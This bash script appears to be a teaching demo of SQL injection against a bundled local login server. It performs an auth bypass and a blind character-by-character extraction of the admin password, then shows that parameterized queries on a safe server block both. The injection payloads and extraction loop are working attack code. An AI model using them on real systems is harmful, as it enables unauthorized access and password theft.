#!/bin/bash
#
# Blind SQL injection exploit against vulnerable-server.js
#
# Demonstrates data theft without ever seeing query results directly.
# The server only says "success" or "fail" — but that single bit of
# information is enough to extract the admin's full password,
# one character at a time.
#
# Technique: for each position, ask "is the Nth character equal to X?"
# via an injected SUBSTRING() check. If the server says "success",
# we guessed right. Repeat for every position.

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
SERVER_URL="http://localhost:3002"
VULN_SERVER="$SCRIPT_DIR/vulnerable-server.js"
SAFE_SERVER="$SCRIPT_DIR/safe-server.js"

cleanup() {
    [[ -n "$SERVER_PID" ]] && kill "$SERVER_PID" 2>/dev/null
    wait "$SERVER_PID" 2>/dev/null
}
trap cleanup EXIT

wait_for_server() {
    local attempts=0
    while ! curl -s "$SERVER_URL/?username=test&password=test" >/dev/null 2>&1; do
        sleep 0.2
        ((attempts++))
        if [[ $attempts -gt 25 ]]; then
            echo "ERROR: Server did not start within 5 seconds."
            exit 1
        fi
    done
}

# Helper: send a login request and check if the server says "success"
# Returns 0 (true) if login succeeded, 1 (false) if it failed.
try_login() {
    local username="$1"
    local password="$2"
    local response
    response=$(curl -s --get "$SERVER_URL/" \
        --data-urlencode "username=$username" \
        --data-urlencode "password=$password")
    echo "$response" | grep -q '"success":true'
}

# ─────────────────────────────────────────────
echo "============================================="
echo "  Blind SQL Injection: Stealing a Password"
echo "  One character at a time"
echo "============================================="
echo ""

# ─────────────────────────────────────────────
echo "=== Phase 1: Starting vulnerable server ==="
node "$VULN_SERVER" &
SERVER_PID=$!
wait_for_server
echo "Server running (PID $SERVER_PID)"
echo ""

# ─────────────────────────────────────────────
echo "=== Phase 2: Normal login attempt ==="
echo ""
echo "> username=alice  password=password123"
RESP=$(curl -s --get "$SERVER_URL/" \
    --data-urlencode "username=alice" \
    --data-urlencode "password=password123")
echo "Response: $RESP"
echo ""

echo "> username=alice  password=WRONG"
RESP=$(curl -s --get "$SERVER_URL/" \
    --data-urlencode "username=alice" \
    --data-urlencode "password=WRONG")
echo "Response: $RESP"
echo ""
echo "So the server gives us one bit: success or fail."
echo "That's enough."
echo ""

# ─────────────────────────────────────────────
echo "=== Phase 3: Bypass authentication ==="
echo ""
echo "Injection: password = ' OR '1'='1"
echo "SQL becomes: ...AND password = '' OR '1'='1'"
echo ""
if try_login "admin" "' OR '1'='1"; then
    echo "Logged in as admin without knowing the password!"
else
    echo "FAILED (unexpected)"
fi
echo ""

# ─────────────────────────────────────────────
echo "=== Phase 4: Blind extraction — finding password length ==="
echo ""
echo "Injection template:"
echo "  ' OR (SELECT LENGTH(password) FROM users WHERE username='admin') = N --"
echo ""

PASSWORD_LEN=0
for len in $(seq 1 30); do
    INJECTION="' OR (SELECT LENGTH(password) FROM users WHERE username='admin') = $len --"
    if try_login "admin" "$INJECTION"; then
        PASSWORD_LEN=$len
        echo "Password length: $len characters"
        break
    fi
done

if [[ $PASSWORD_LEN -eq 0 ]]; then
    echo "ERROR: Could not determine password length"
    exit 1
fi
echo ""

# ─────────────────────────────────────────────
echo "=== Phase 5: Blind extraction — stealing password char by char ==="
echo ""
echo "Injection template:"
echo "  ' OR SUBSTRING((SELECT password FROM users WHERE username='admin'),N,1) = 'X' --"
echo ""

# Searchable characters: lowercase, uppercase, digits, common symbols
CHARSET='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*_-+.?'

STOLEN_PASSWORD=""
for pos in $(seq 1 "$PASSWORD_LEN"); do
    printf "  Position %2d: " "$pos"
    FOUND=false

    for (( i=0; i<${#CHARSET}; i++ )); do
        CHAR="${CHARSET:$i:1}"
        INJECTION="' OR SUBSTR((SELECT password FROM users WHERE username='admin'),$pos,1) = '$CHAR' --"

        if try_login "admin" "$INJECTION"; then
            STOLEN_PASSWORD="${STOLEN_PASSWORD}${CHAR}"
            printf "'%s'  (password so far: %s)\n" "$CHAR" "$STOLEN_PASSWORD"
            FOUND=true
            break
        fi
    done

    if [[ "$FOUND" == false ]]; then
        STOLEN_PASSWORD="${STOLEN_PASSWORD}?"
        printf "???  (character not in search set)\n"
    fi
done

echo ""
echo "========================================="
echo "  STOLEN PASSWORD: $STOLEN_PASSWORD"
echo "========================================="
echo ""

# ─────────────────────────────────────────────
echo "=== Phase 6: Verify stolen password works ==="
echo ""
echo "> username=admin  password=$STOLEN_PASSWORD"
if try_login "admin" "$STOLEN_PASSWORD"; then
    echo "Login successful! Password confirmed."
else
    echo "Login failed — password may contain characters outside our charset."
fi
echo ""

# ─────────────────────────────────────────────
echo "=== Phase 7: Same attack against the safe server ==="
echo ""
kill "$SERVER_PID" 2>/dev/null
wait "$SERVER_PID" 2>/dev/null
sleep 0.5

node "$SAFE_SERVER" &
SERVER_PID=$!
wait_for_server
echo "Safe server running (PID $SERVER_PID)"
echo ""

echo "Trying auth bypass: password = ' OR '1'='1"
if try_login "admin" "' OR '1'='1"; then
    echo "FAIL: Safe server is still vulnerable!"
else
    echo "BLOCKED. The parameterized query treated the injection as a"
    echo "literal password string. No SQL logic was injected."
fi
echo ""

echo "Trying blind extraction of first character..."
INJECTION="' OR SUBSTR((SELECT password FROM users WHERE username='admin'),1,1) = 'z' --"
if try_login "admin" "$INJECTION"; then
    echo "FAIL: Blind injection still works!"
else
    echo "BLOCKED. The database saw the entire injection string as the"
    echo "password value. SUBSTR was never executed as SQL — it was"
    echo "compared as literal text. No information leaked."
fi
echo ""

echo "============================================="
echo "  Summary"
echo "============================================="
echo ""
echo "  With string concatenation:"
echo "    - Auth bypass:       trivial (' OR '1'='1)"
echo "    - Password theft:    ~${PASSWORD_LEN}x${#CHARSET} requests = $((PASSWORD_LEN * ${#CHARSET})) worst case"
echo "    - Real requests:     easily scriptable, takes seconds"
echo ""
echo "  With parameterized queries:"
echo "    - Every injection is treated as literal data"
echo "    - The fix is one line: use ? placeholders"
echo "============================================="
